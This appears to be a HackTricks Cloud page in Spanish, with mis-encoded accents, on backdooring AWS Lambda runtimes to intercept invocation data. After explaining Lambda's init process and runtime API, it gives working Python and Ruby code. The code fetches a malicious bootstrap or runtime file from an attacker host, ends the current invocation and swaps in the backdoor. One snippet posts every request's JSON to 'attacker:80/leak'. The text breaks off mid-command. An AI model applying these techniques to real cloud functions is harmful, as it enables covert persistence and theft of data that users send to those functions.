# AWS - Robar solicitudes de Lambda

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PR a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Introducci√≥n <a href="#python-runtime" id="python-runtime"></a>

Este ataque supone que tienes alg√∫n tipo de **acceso sobre una Lambda en ejecuci√≥n**.\
Adem√°s, algo importante a tener en cuenta es que **las invocaciones de Lambda no est√°n completamente separadas entre s√≠, sino que est√°n aisladas**. Podr√≠an ejecutarse, aunque no simult√°neamente, en el mismo entorno de ejecuci√≥n. Con eso en mente, comencemos a diseccionar ese entorno.

### Aislamiento

El aislamiento de Lambda utiliza estos cgroups:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (4).png" alt=""><figcaption></figcaption></figure>

Como el prefijo 'sandbox' no coincid√≠a con ning√∫n motor de contenedor com√∫n (docker, podman, LXD, rkt), podr√≠a ser un motor de contenedor propietario, que podr√≠a estar utilizando internamente un tiempo de ejecuci√≥n de contenedor de c√≥digo abierto como [runC](https://github.com/opencontainers/runc).

### C√≥mo funcionan las Lambdas  <a href="#python-runtime" id="python-runtime"></a>

Esta parece ser la arquitectura de Lambda en Python:

<figure><img src="../../../../.gitbook/assets/image (2) (6).png" alt=""><figcaption></figcaption></figure>

1. Un proceso fuera del contenedor, denominado "**slicer**" en el binario init, env√≠a eventos de invocaci√≥n al proceso **init** a trav√©s de memoria compartida.
2. El proceso init configura un servidor HTTP en el puerto 9001 (codificado en duro), con varios puntos finales expuestos:
   1. /2018-06-01/runtime/invocation/**next** ‚Äì obtener el siguiente evento de invocaci√≥n
   2. /2018-06-01/runtime/invocation/{invoke-id}/**response** ‚Äì devolver la respuesta del controlador para la invocaci√≥n
   3. /2018-06-01/runtime/invocation/{invoke-id}/**error** ‚Äì devolver un error de ejecuci√≥n
3. En `bootstrap.py`, el siguiente bucle **consulta el proceso init para un nuevo evento**, y luego **llama a la funci√≥n del usuario** para manejarlo (aqu√≠, se ejecuta el controlador de solicitudes que cargaste).\


    <figure><img src="../../../../.gitbook/assets/image (11) (4).png" alt=""><figcaption></figcaption></figure>
4. La **respuesta del controlador se env√≠a de vuelta al proceso init** a trav√©s de uno de los siguientes puntos finales:
   1. `/{invoke-id}/response` ‚Äì si el controlador del usuario se ejecut√≥ correctamente
   2. `/{invoke-id}/error` ‚Äì si se produjo una excepci√≥n durante el manejo de la invocaci√≥n

## Resumen de la t√©cnica <a href="#python-runtime" id="python-runtime"></a>

Es posible **sustituir el script de arranque** con c√≥digo malicioso para poder **interceptar los datos** enviados a la funci√≥n Lambda.\
Tenga en cuenta que **otros motores en otros lenguajes** tienen otro **script de arranque** escrito en ese lenguaje, por lo que esto se puede hacer **tambi√©n en otras lambdas que usan otros lenguajes**, no solo en Python.

## Python <a href="#python-runtime" id="python-runtime"></a>

Desde la lambda, descarga **`/var/runtime/bootstrap.py`**  (o simplemente inicia **tu propia lambda** y cons√≠guelo) y agrega la puerta trasera que filtrar√° todos los datos enviados a Lambda. Solo necesitas agregar un par de l√≠neas como:

<figure><img src="../../../../.gitbook/assets/image (2) (1) (3).png" alt=""><figcaption></figcaption></figure>

### Reemplazar tiempo de ejecuci√≥n

Ahora, con el nuevo **`boostrap.py` creado**, es posible **descargarlo**, **finalizar la invocaci√≥n actual de lambda** y ejecutarlo para **reemplazar** el leg√≠timo:

```python
import os
from urllib import request

# Descargar bootstrap.py desde tu servidor
r = request.urlopen('http://attacker.com/bootstrap.py')
with open('/tmp/bootstrap.py', 'w') as f:
    f.write(r.read().decode('utf-8'))

# Obtener ID de invocaci√≥n y finalizarla
req = request.urlopen("http://127.0.0.1:9001/2018-06-01/runtime/invocation/next")
inv_id = req.headers["Lambda-Runtime-Aws-Request-Id"]
req = request.Request(f"http://127.0.0.1:9001/2018-06-01/runtime/invocation/{inv_id}/response", data=b"null")
req.add_header("Content-Type", "application/x-www-form-urlencoded")
request.urlopen(req)

# Iniciar tu bootstrap.py
os.system("python3 /tmp/bootstrap.py")
```

O tambi√©n puedes usar [twist\_runtime.py](https://github.com/twistlock/lambda-persistency-poc/blob/master/poc/twist\_runtime.py), que finalizar√° la invocaci√≥n como se hizo anteriormente, ejecutar√° el nuevo bootstrap y exfiltrar√° la informaci√≥n.

{% hint style="warning" %}
Si una funci√≥n lambda no se usa durante 5-15 minutos, se cerrar√° y todos los cambios se perder√°n la pr√≥xima vez que se invoque.
{% endhint %}

## Tiempo de ejecuci√≥n de Ruby <a href="#ruby-runtime" id="ruby-runtime"></a>

En Ruby, el archivo que desea agregar una puerta trasera es el archivo **`/var/runtime/lib/runtime.rb`** (obt√©ngalo del sistema o ejecutando su propia lambda).

Agregar una puerta trasera es tan simple como en la versi√≥n de Python:

```ruby
# Agregar un require al principio
require 'json'
require 'net/http'
[...]
# En el bucle donde se trata la invocaci√≥n
begin 
    context = lambdaContext.new(raw_request)
    uri = URI('http://attacker:80/leak')
    Net::HTTP.post(uri,JSON.generate(request))
    [...]
```

Luego, solo necesita hacer lo que hizo en la versi√≥n de Python con solo un cambio:

* **Descargar la puerta trasera en un directorio**
* **Crear un enlace simb√≥lico** `/var/runtime/lib/*` con el directorio donde se encuentra la puerta trasera
* Finalizar la invocaci√≥n actual de lambda

```ruby
# Puedes obtener una shell de Ruby con 'irb' o ejecutar desde la shell con ruby -e "..."

require 'net/http'

# Descargar nuevo script
uri = URI("http://attacker/rumtime.rb")
r = Net::HTTP.get_response(uri)
File.write("/tmp/rumtime.rb", r.body)

# Crear enlace simb√≥lico
ln -s /